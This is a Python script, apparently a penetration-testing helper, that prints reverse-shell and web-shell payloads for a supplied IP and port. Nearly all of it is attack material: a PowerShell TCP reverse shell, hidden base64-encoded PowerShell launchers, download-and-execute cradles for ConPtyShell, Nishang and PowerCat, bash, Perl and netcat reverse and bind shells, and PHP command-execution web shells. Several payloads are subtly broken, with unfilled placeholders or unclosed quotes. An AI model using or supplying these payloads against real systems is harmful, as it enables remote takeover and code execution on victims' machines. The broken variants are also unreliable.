#!/usr/bin/python3

import sys
import subprocess
from base64 import b64encode

    

def main():
    if len(sys.argv) < 3:
        print("Usage: script.py <IP> <PORT>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]


        # Ejecutar el comando "stty size"
    output = subprocess.check_output(["stty", "size"]).decode().strip()
    rows, columns = map(int, output.split())

    
    print("\n********** Listener **********\n")
    print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
    print(f"rlwrap nc -nlvp {port}")

    print("\n********** tty **********\n")
    print(f"script /dev/null -c bash")
    print(f"ctrl + z")
    print(f"stty raw -echo; fg")
    print(f"export TERM=xterm; reset xterm")

    print("\n\n\n********** PowerShell payload b64 encode **********\n")
    print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")

    print("\n\n\n********** Powershell reverse shell oneliner **********\n")
    text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'

    encoded = b64encode(text.encode("utf-16le")[2:]).decode()
    print(text)
    print(f"\npowershell -nop -w hidden -enc {encoded}")


    print("\n\n\n********** ConPtyShell RevShell **********\n")
    print(f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")

    print("\n********** ConPtyShell RevShell b64 **********\n")
    payload = "Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** ConPtyShell Download & IEX **********\n")
    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')")

    print("\n********** ConPtyShell Download & IEX b64 **********\n")
    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1')"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** ConPtyShell Download & Execution **********\n")
    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")

    print("\n********** ConPtyShell Download & Execution b64 **********\n")
    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}" 
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")




    print("\n\n\n********** Nishang payload **********\n")
    print(f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")

    print("\n********** Nishang payload b64**********\n")
    payload = "Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** Nishang Download & IEX **********\n")
    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1")

    print("\n********** Nishang Download & IEX b64 **********\n")
    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** Nishang Download & Execution **********\n")
    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}")

    print("\n********** Nishang Download & Execution b64 **********\n")
    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")



    print("\n\n\n********** PowerCat payload **********\n")
    print(f"powercat -c {ip} -p {port} -e powershell")

    print("\n********** PowerCat payload b64**********\n")
    payload = "powercat -c {ip} -p {port} -e powershell"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** PowerCat Download & IEX **********\n")
    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1")

    print("\n********** PowerCat Download & IEX b64 **********\n")
    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")

    print("\n********** PowerCat Download & Execution **********\n")
    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1; powercat -c {ip} -p {port} -e powershell")

    print("\n********** PowerCat Download & Execution b64 **********\n")
    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1; powercat -c {ip} -p {port} -e powershell"
    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
    print(f"powershell -nop -w hidden -enc {p64}")


    

    print("\n\n\n********** Bash **********\n")
    bash_payloads = [
        f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        f"bash+-c+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'",
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        f"rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20{ip}%20{port}%20%3E/tmp/f",
        f"nc {ip} {port} -e /bin/sh"
    ]
    for payload in bash_payloads:
        print(payload)

    print("\n********** PHP **********\n")
    php_payloads = [
        """<?php
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
  }
?>""",
        '<%3fphp+if(isset($_REQUEST[\'cmd\'])){+echo+"<pre>"%3b+$cmd+%3d+($_REQUEST[\'cmd\'])%3b+system($cmd)%3b+echo+"</pre>"%3b+die%3b+}+%3f>',
        '<?php echo system($_GET[\'cmd\']); ?>',
        '<%3fphp+echo+system($_GET[cmd])%3b+%3f>'
    ]
    for payload in php_payloads:
        print(payload)

    print("\n********** Perl **********\n")
    perl_payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    print(perl_payload)

    print("\n********** Netcat Bind Shell **********\n")
    print("Linux:\n")
    print(f"\tnc -nlvp {port} -e /bin/bash")
    print(f"\tnc {ip} {port}\n")
    print("Windows:\n")
    print(f"\tnc.exe -nlvp {port} -e cmd.exe")
    print(f"\tnc {ip} {port}")

    print("\n********** Netcat Reverse Shell **********\n")
    print("Linux:\n")
    print(f"\twhich /usr/bin/nc")
    print(f"\tnc -e /bin/bash {ip} {port}\n")
    print("Windows:\n")
    print(f"\tnc.exe -e cmd {ip} {port}")
    print(f"\t.\\nc64.exe -e powershell {ip} {port}\n")

    print(f"More shells at: /usr/share/webshells\n")

if __name__ == "__main__":
    main()
